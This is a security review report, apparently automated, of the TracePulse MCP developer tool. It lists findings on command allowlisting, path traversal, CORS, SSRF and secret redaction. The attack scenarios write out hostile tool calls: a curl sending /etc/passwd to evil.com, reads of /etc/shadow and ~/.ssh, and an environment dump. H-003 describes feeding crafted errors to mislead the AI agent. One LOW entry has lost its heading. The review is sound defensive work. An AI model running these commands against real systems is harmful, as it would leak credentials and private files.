# SRR-003 — Tier 3 Sprint-Level Security Review

**Date:** 2026-04-30
**Version:** 0.9.2
**Scope:** Full codebase (`src/` directory — 90+ source files)
**Reviewer:** Automated (Kiro CLI)
**Previous Reviews:** SRR-001 (v0.8.0 T2), SRR-002 (v0.9.0 T2), CRR-001 (v0.9.2)

---

## Executive Summary

TracePulse v0.9.2 shows strong security posture for a dev-time tool. Previous reviews (SRR-001, SRR-002, CRR-001) drove significant improvements: command allowlisting, shell metacharacter rejection, SSRF restriction to localhost, restart cooldown, and expanded secret redaction (16 patterns). This Tier 3 review covers the full codebase across 10 focus areas.

**Findings:** 0 CRITICAL, 3 HIGH, 5 MEDIUM, 4 LOW

The most significant findings are: (1) `run_and_watch` allowlist bypass via `bash` prefix enabling arbitrary command execution, (2) `cwd` parameter in `run_and_watch` allowing path traversal to execute commands in arbitrary directories, and (3) missing CORS headers on the log collector HTTP server enabling cross-origin request forgery from malicious web pages.

No new dependency supply chain risks — the project maintains a single runtime dependency (`@modelcontextprotocol/sdk`).

## Findings

### HIGH Severity

#### H-001: `run_and_watch` Allowlist Bypass via `bash` Prefix

- **Severity:** HIGH
- **Confidence:** CONFIRMED
- **File:** `src/tools/run-and-watch.ts:18`
- **CWE:** CWE-78 (OS Command Injection)

**Code Evidence:**
```typescript
const DEFAULT_ALLOWED_PREFIXES = [
  "npx", "npm", "node", "pytest", "python", "tsc", "eslint",
  "vitest", "jest", "go test", "cargo test", "make", "bash",
];
```

**Attack Scenario:**
The `bash` prefix in the allowlist permits arbitrary command execution. An MCP client (or a compromised agent) can call:
```
run_and_watch({ command: "bash -c 'curl http://evil.com/exfil?data=$(cat /etc/passwd)'" })
```
The shell metacharacter check on line 42 (`/[;&|`$(){}!<>]/`) would catch `$()` in this specific example, but simpler payloads bypass it:
```
run_and_watch({ command: "bash /tmp/malicious-script.sh" })
```
This executes an arbitrary script file with no metacharacters. The `make` prefix has a similar risk — `make` targets can execute arbitrary shell commands.

**Remediation:**
Remove `bash` and `make` from `DEFAULT_ALLOWED_PREFIXES`. If `bash` is needed for specific use cases, require the full command to match a stricter pattern (e.g., `bash -c` only with the script content validated, or `bash scripts/` with path restriction). Consider making the allowlist configurable via `tracepulse.config.json` so users can opt in to broader access.

#### H-002: `run_and_watch` `cwd` Parameter Allows Arbitrary Directory Traversal

- **Severity:** HIGH
- **Confidence:** CONFIRMED
- **File:** `src/tools/run-and-watch.ts:60`
- **CWE:** CWE-22 (Path Traversal)

**Code Evidence:**
```typescript
const child = spawn(command, {
  shell: true,
  stdio: ["ignore", "pipe", "pipe"],
  env: { ...process.env, PYTHONUNBUFFERED: "1", FORCE_COLOR: "0" },
  ...(cwd ? { cwd } : {}),
});
```

The `cwd` parameter is passed directly from MCP tool input with no validation or path restriction. The Zod schema defines it as `z.string().optional()` with no constraints.

**Attack Scenario:**
A compromised or malicious agent can execute allowed commands in sensitive directories:
```
run_and_watch({ command: "node -e 'require(\"fs\").readFileSync(\"/etc/shadow\")'", cwd: "/" })
```
Or use `cwd` to access files outside the project:
```
run_and_watch({ command: "npx cat-file", cwd: "/home/user/.ssh" })
```

**Remediation:**
Validate `cwd` against the project root directory. Resolve the path and verify it is a subdirectory of `process.cwd()` or the configured project root:
```typescript
const resolved = path.resolve(cwd);
const projectRoot = process.cwd();
if (!resolved.startsWith(projectRoot)) {
  return errorResult("cwd must be within the project directory");
}
```

#### H-003: Log Collector HTTP Server Missing CORS Restrictions

- **Severity:** HIGH
- **Confidence:** CONFIRMED
- **File:** `src/correlation/sources/log-collector.ts:85-140`
- **CWE:** CWE-346 (Origin Validation Error)

**Code Evidence:**
The `handleRequest` function sets no CORS headers on any response. The server accepts POST requests from any origin.

**Attack Scenario:**
A malicious web page opened in the developer's browser can POST crafted payloads to `http://localhost:9801/api/v1/errors` or `/api/v1/crashes`. This could:
1. **Poison the error buffer** with fake errors, misleading the AI agent into making incorrect code changes.
2. **Inject crafted error messages** that, when displayed by the agent, could contain social engineering content.

While the server binds to 127.0.0.1, browsers allow cross-origin POST requests to localhost from any page (the Same-Origin Policy only restricts reading the response, not sending the request).

**Remediation:**
Add an `Origin` header check to reject requests not from localhost origins:
```typescript
const origin = req.headers.origin;
if (origin && !origin.match(/^https?:\/\/(localhost|127\.0\.0\.1)(:\d+)?$/)) {
  res.writeHead(403, { "Content-Type": "application/json" });
  res.end(JSON.stringify({ error: "Forbidden origin" }));
  return;
}
res.setHeader("Access-Control-Allow-Origin", "http://localhost");
```
Also add a shared secret or nonce that the ErrorBoundary snippet must include, preventing blind CSRF.

### MEDIUM Severity

#### M-001: `register_probe` SSRF Bypass via DNS Rebinding

- **Severity:** MEDIUM
- **Confidence:** LIKELY
- **File:** `src/tools/register-probe.ts:155-162`
- **CWE:** CWE-918 (Server-Side Request Forgery)

**Code Evidence:**
```typescript
const parsed = new URL(probe.url);
const host = parsed.hostname;
if (host !== "localhost" && host !== "127.0.0.1" && host !== "::1") {
  return { content: [{ type: "text", text: "Probes are restricted to localhost URLs only" }], isError: true };
}
```

The hostname check happens at registration time, but DNS resolution happens at probe execution time. A DNS rebinding attack could register `http://evil-rebind.example.com:8080/` which resolves to `127.0.0.1` at registration, then resolves to an internal IP at execution time.

Additionally, `localhost` can resolve to any IP depending on `/etc/hosts` configuration. The check does not cover `0.0.0.0`, `[::ffff:127.0.0.1]`, or other loopback representations.

**Remediation:**
1. Resolve the hostname to an IP at registration time and verify it's a loopback address.
2. At execution time, use the resolved IP directly instead of the hostname.
3. Add `0.0.0.0` and IPv4-mapped IPv6 addresses to the check:
```typescript
const LOOPBACK = new Set(["127.0.0.1", "::1", "0.0.0.0", "localhost"]);
```

#### M-003: `process-spawner.ts` Inherits Full `process.env` Including Secrets

- **Severity:** MEDIUM
- **Confidence:** CONFIRMED
- **File:** `src/collectors/process-spawner.ts:79-87`
- **CWE:** CWE-200 (Information Exposure)

**Code Evidence:**
```typescript
env: {
  ...process.env,
  PYTHONUNBUFFERED: "1",
  PYTHONDONTWRITEBYTECODE: "1",
},
```

The spawned child process inherits the full parent environment, including any secrets in environment variables (API keys, database credentials, tokens). While this is necessary for the dev server to function, the same pattern in `run_and_watch.ts:60` means arbitrary commands executed via `run_and_watch` also inherit all secrets.

**Attack Scenario:**
Combined with H-001 (bash allowlist), an attacker could exfiltrate environment variables:
```
run_and_watch({ command: "bash -c 'env'" })
```
The output would flow through the parser pipeline and be returned in the MCP response. While the secret redactor runs on output, it only catches 16 known patterns — custom env vars with non-standard names would leak.

**Remediation:**
For `run_and_watch` specifically, consider filtering the environment to exclude known secret patterns:
```typescript
const safeEnv = Object.fromEntries(
  Object.entries(process.env).filter(([k]) =>
    !/(SECRET|TOKEN|KEY|PASSWORD|CREDENTIAL|AUTH)/i.test(k)
  )
);
```
For the process spawner (dev server), inheriting the full env is correct behavior — document this as a known design decision.

#### M-004: Secret Redaction Missing Patterns for Newer Cloud Providers

- **Severity:** MEDIUM
- **Confidence:** CONFIRMED
- **File:** `src/constants/redaction.ts`
- **CWE:** CWE-532 (Information Exposure Through Log Files)

**Code Evidence:**
The 16 redaction patterns cover major providers but miss:

1. **Supabase keys** — `sbp_` prefix (service role keys), `eyJ` prefix already catches JWTs but not the `sbp_` format
2. **Vercel tokens** — no specific pattern for Vercel deployment tokens
3. **Cloudflare API tokens** — no pattern for CF tokens
4. **HashiCorp Vault tokens** — `hvs.` prefix tokens
5. **Twilio auth tokens** — 32-character hex strings after `AuthToken`
6. **SendGrid API keys** — `SG.` prefix
7. **Mailgun API keys** — `key-` prefix (short, may cause false positives)
8. **SSH private keys** — `-----BEGIN OPENSSH PRIVATE KEY-----` (the current PEM pattern only matches RSA/EC/DSA)

The generic `key-value-secret` pattern (last in the list) catches many of these when they appear as `TOKEN=xxx`, but not when they appear bare in log output.

**Remediation:**
Add patterns for the most common missing providers:
```typescript
["supabase-key", /sbp_[A-Za-z0-9]{40,}/g],
["hashicorp-vault", /hvs\.[A-Za-z0-9_-]{20,}/g],
["sendgrid-key", /SG\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}/g],
["openssh-key", /-----BEGIN OPENSSH PRIVATE KEY-----/g],
```

#### M-005: `config-scanner.ts` Reads `.env` Files Without Redacting Values in Memory

- **Severity:** MEDIUM
- **Confidence:** CONFIRMED
- **File:** `src/infra/config-scanner.ts:62-80`
- **CWE:** CWE-200 (Information Exposure)

**Code Evidence:**
```typescript
const content = readFileSync(envFile, "utf-8");
for (const line of content.split("\n")) {
  // ...
  const value = trimmed.slice(eqIdx + 1).trim().replace(/^["']|["']$/g, "");
  // ...
  const match = value.match(URL_PATTERN);
```

The scanner reads `.env` file contents into memory and parses URL values including credentials (e.g., `postgresql://user:password@host:5432/db`). The extracted `host` and `port` are stored in `DiscoveredService`, but the full URL with credentials exists in memory during parsing.

The `source` field stores `${envFile}:${varName}` (e.g., `.env:DATABASE_URL`) which is safe, but the URL parsing extracts the credential portion as part of the regex match.

**Remediation:**
This is acceptable for a dev-time tool, but ensure the full URL value is never included in any MCP response or log output. Add a comment documenting this design decision. Consider running `redact()` on the raw value before URL parsing.

### LOW Severity

#### L-001: ReDoS Risk in `key-value-secret` Redaction Pattern

- **Severity:** LOW
- **Confidence:** NEEDS VALIDATION
- **File:** `src/constants/redaction.ts:62-65`
- **CWE:** CWE-1333 (Inefficient Regular Expression Complexity)

**Code Evidence:**
```typescript
/(?:password|passwd|secret|token|api_key|apikey|access_key|private_key|auth_token|client_secret)\s*[=:]\s*(?:"[^"]*"|'[^']*'|\S+)/gi
```

The alternation group `(?:"[^"]*"|'[^']*'|\S+)` is safe against ReDoS because `[^"]*`, `[^']*`, and `\S+` are non-overlapping and use possessive-like character classes. However, the leading alternation `(?:password|passwd|secret|...)` with 10 alternatives could cause minor backtracking on lines containing partial matches.

The `MAX_PARSE_INPUT_LENGTH` (10,000 chars) limit in the pipeline provides a hard cap on input size, making catastrophic backtracking unlikely.

**Remediation:**
No immediate action needed. The 10KB input limit is an effective mitigation. For defense in depth, consider adding a per-regex timeout or using `\S+?` (lazy) instead of `\S+` (greedy) in the value capture group.

#### L-002: `check_port` No Port Range Validation

- **Severity:** LOW
- **Confidence:** CONFIRMED
- **File:** `src/tools/check-port.ts:20`
- **CWE:** CWE-20 (Improper Input Validation)

**Code Evidence:**
```typescript
const portList = ports ?? (port ? [port] : []);
```

The `port` and `ports` parameters are not validated for range (1-65535) or type safety beyond Zod's `z.number()`. A negative port or port > 65535 would cause a Node.js `net.connect` error but wouldn't be caught with a user-friendly message. An extremely large `ports` array could cause resource exhaustion via many simultaneous TCP connections.

**Remediation:**
Add range validation and array size limit:
```typescript
if (portList.some(p => p < 1 || p > 65535)) {
  return errorResult("Port must be between 1 and 65535");
}
if (portList.length > 20) {
  return errorResult("Maximum 20 ports per check");
}
```

- **Confidence:** CONFIRMED
- **File:** `src/collectors/process-spawner.ts:97`, `src/config/config-loader.ts:60`

**Code Evidence:**
```typescript
// process-spawner.ts:97
reject(new Error(`Failed to spawn command "${command}": ${err.message}`));
```

Acceptable for current dev-time scope. Document as a known behavior. If TracePulse is ever deployed in shared environments, add a `--redact-paths` flag.

#### L-004: `fingerprint-store.ts` No File Permission Restriction on Persistence File

- **Severity:** LOW
- **Confidence:** CONFIRMED
- **File:** `src/persistence/fingerprint-store.ts:67-68`
- **CWE:** CWE-732 (Incorrect Permission Assignment)

**Code Evidence:**
```typescript
mkdirSync(dir, { recursive: true });
// ...
writeFileSync(filePath, JSON.stringify(data, null, 2), "utf-8");
```

The fingerprint persistence file (`.tracepulse/fingerprints.json`) is created with default permissions (typically 0o644 on Linux), making it world-readable. While the file contains only fingerprint hashes (not raw error messages), the `last_message` field (truncated to 200 chars) could contain sensitive information from error messages that survived redaction.

**Remediation:**
Set restrictive permissions on the persistence file:
```typescript
writeFileSync(filePath, JSON.stringify(data, null, 2), { encoding: "utf-8", mode: 0o600 });
```

## Areas Reviewed — No Issues Found

### Command Injection Safety ✅

- **`git-diff-correlator.ts`**: Uses `execFile("git", args, ...)` (not `exec`), preventing shell injection. Arguments are hardcoded strings, not user input. ✅
- **`correlate-with-diff.ts`**: Passes hardcoded git arguments through `execGit`. No user input reaches the command. ✅
- **`get-migration-status.ts`**: Does not execute commands directly — returns the command string for the agent to run via `run_and_watch` (which has its own allowlist). ✅
- **`restart-server.ts`**: Uses a callback function, not shell execution. Has a 5-second cooldown. ✅

### Input Validation ✅

- **`validateEventFilters`** (`src/types/events.ts`): Validates `since` (positive number), `source` (enum), `level` (enum), `limit` (positive integer ≤ 100), `message_contains` (non-empty string), `status_code_min` (100-599). ✅
- **`validateConfig`** (`src/config/config-schema.ts`): Validates service names (`[a-z0-9-]`), rejects unknown keys, validates port ranges (1024-65535), checks mutual exclusivity. ✅
- **`watch-controller.ts`**: Validates duration bounds (1-120 seconds). ✅
- **MCP server** (`src/mcp/server.ts`): All tools use Zod schemas for input validation. ✅
- **`frontend-crash-bridge.ts`**: Truncates all string fields (message: 500, stack: 2000, componentStack: 1000, url: 500). ✅

### HTTP Endpoint Security ✅ (partial — see H-003)

- **Localhost binding**: Both `http-transport.ts` and `log-collector.ts` bind to `127.0.0.1`. ✅
- **Body size limit**: Log collector enforces 64KB body limit. ✅
- **Rate limiting**: Token bucket at 100 req/s with proportional refill. ✅
- **JSON validation**: Rejects invalid JSON with 400 status. ✅
- **URL validation**: Parses URL with `new URL()`, rejects invalid formats. ✅

### Process Spawning Safety ✅

- **Detached process groups**: `process-spawner.ts` uses `detached: true` and kills via `-pid` for clean shutdown. ✅
- **Graceful shutdown**: SIGTERM → wait → SIGKILL escalation with configurable timeout. ✅
- **Fast-fail detection**: Non-zero exit within 800ms rejects `start()`. ✅
- **`child.unref()`**: Prevents orphaned processes from keeping Node alive. ✅

### ReDoS Risk ✅

All parser regex patterns were reviewed. Key mitigations:
- **`MAX_PARSE_INPUT_LENGTH` (10,000 chars)**: Hard cap on input to all parsers. ✅
- **ANSI stripping before parsing**: Removes escape sequences that could inflate input. ✅
- **No catastrophic backtracking patterns found**: Parser regexes use anchored patterns (`^`), character classes (`[^"]*`), and non-overlapping alternatives. The most complex patterns (Python `EXCEPTION_LINE_RE`, Java `EXCEPTION_LINE_RE`, Rust `LEGACY_PANIC`) use bounded repetition or non-overlapping groups. ✅
- **Secret redactor**: Creates fresh `RegExp` instances per call to avoid `lastIndex` state bugs. ✅

### File System Access Safety ✅

- **`log-file-tailer.ts`**: Accepts a file path from CLI args (trusted input), not from MCP tool calls. ✅
- **`config-loader.ts`**: Reads config from CLI-specified path or default `tracepulse.config.json`. ✅
- **`fingerprint-store.ts`**: Writes only to `.tracepulse/` directory. ✅
- **No MCP tool accepts arbitrary file paths**: File operations are limited to CLI-specified paths and hardcoded locations. ✅

### Rate Limiting ✅

- **Log collector**: 100 req/s token bucket with proportional refill. ✅
- **`restart_server`**: 5-second cooldown between restarts. ✅
- **`run_and_watch`**: 60-second default timeout, configurable. ✅
- **`watch_for_errors`**: 120-second maximum duration. ✅
- **Ring buffer**: 500-event FIFO cap prevents memory exhaustion. ✅
